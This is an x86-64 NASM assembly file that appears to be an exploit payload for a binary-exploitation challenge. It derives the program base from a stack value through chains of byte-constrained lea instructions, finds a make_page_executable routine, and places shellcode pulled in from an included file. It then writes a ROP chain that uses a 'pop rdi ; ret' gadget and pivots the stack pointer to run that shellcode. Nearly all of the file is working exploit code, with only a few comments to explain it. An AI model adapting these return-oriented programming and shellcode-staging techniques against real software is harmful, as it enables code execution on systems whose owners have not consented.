BITS 64

mov  r14, [rsp]

lea r13, [r14-0x7f]
lea r14, [r13-0x7f]
lea r13, [r14-0x7f]
lea r14, [r13-0x7f]
lea r13, [r14-0x7f]
lea r14, [r13-0x7f]
lea r13, [r14-0x7f]
lea r14, [r13-0x7f]
lea r13, [r14-0x7f]
lea r14, [r13-0x7f]
lea r13, [r14-0x7f]
lea r14, [r13-0x7f]
lea r13, [r14-0x7f]
lea r14, [r13-0x7f]
lea r13, [r14-0x7f]
lea r14, [r13-0x7f]
lea r13, [r14-0x7f]
lea r14, [r13-0x7f]
lea r13, [r14-0x7f]
lea r14, [r13-0x7f]
lea r13, [r14-0x7f]
lea r14, [r13-0x7f]
lea r13, [r14-0x2e]
; r13 now points to program base

lea r14, [r13-0x7f]
lea r15, [r14-0x7f]
lea r14, [r15-0x80]
lea r15, [r14-0x7f]
lea r14, [r15-0x7f]
lea r15, [r14-0x7f]
lea r14, [r15-0x7f]
lea r15, [r14-0x7f]
lea r14, [r15-0x7f]
lea r15, [r14-0x7f]
lea r14, [r15-0x7f]
lea r15, [r14-0x6a]

mov r14, r13
ret
; r14 now points to program base

mov r13, r15
ret

add r13, 0x1
; r13 now points to make_page_executable

add r14, 0x70
add r14, 0x70
add r14, 0x70
add r14, 0x70

add r14, 0x42

lea r15, [r14+0x7f]
lea r14, [r15+0x7f]
lea r15, [r14+0x7f]
lea r14, [r15+0x7f]
lea r15, [r14+0x7f]
lea r14, [r15+0x7f]
lea r15, [r14+0x7f]
lea r14, [r15+0x7f]
lea r15, [r14+0x7f]
lea r14, [r15+0x7f]
;r14 is now the start of the shellcode

mov r15, rsp
ret
mov [r15+0x68], r14

mov r15, r14
ret

%include "out2.asm"

lea r15, [r14-0x7f]
lea r14, [r15-0x7f]
lea r15, [r14-0x7f]
lea r14, [r15-0x7f]
lea r15, [r14-0x7f]
lea r14, [r15-0x7f]
lea r15, [r14-0x7f]
lea r14, [r15-0x7f]
lea r15, [r14-0x7f]
lea r14, [r15-0x7f]

; r13 now points to make_page_executable
; r14 points to page of written shellcode
; r15 also points to page of written shellcode
mov r15, rsp
ret

;sub r15, 0x20

mov [r15+0x60], r13
mov [r15+0x58], r14
lea r15, [r13+0x7f]
lea r13, [r15+0x7f]
lea r15, [r13+0x7f]
lea r13, [r15+0x26]
; points to a pop rdi ; ret

mov r15, rsp
ret
mov [r15+0x50], r13

int3
ret
ret
ret

lea rsp, [r15+0x50]

;int3
;ret
;ret
;ret

;lea r15, [r14+0x7f]
;lea r14, [r15+0x7f]
;lea r15, [r14+0x7f]
;lea r14, [r15+0x7f]
;lea r15, [r14+0x7f]
;lea r14, [r15+0x7f]
;lea r15, [r14+0x7f]
;lea r14, [r15+0x7f]
;lea r15, [r14+0x7f]
;lea r14, [r15+0x7f]
;
;;mov rdi, r14
;;jmp r13
;
;call r14
;ret
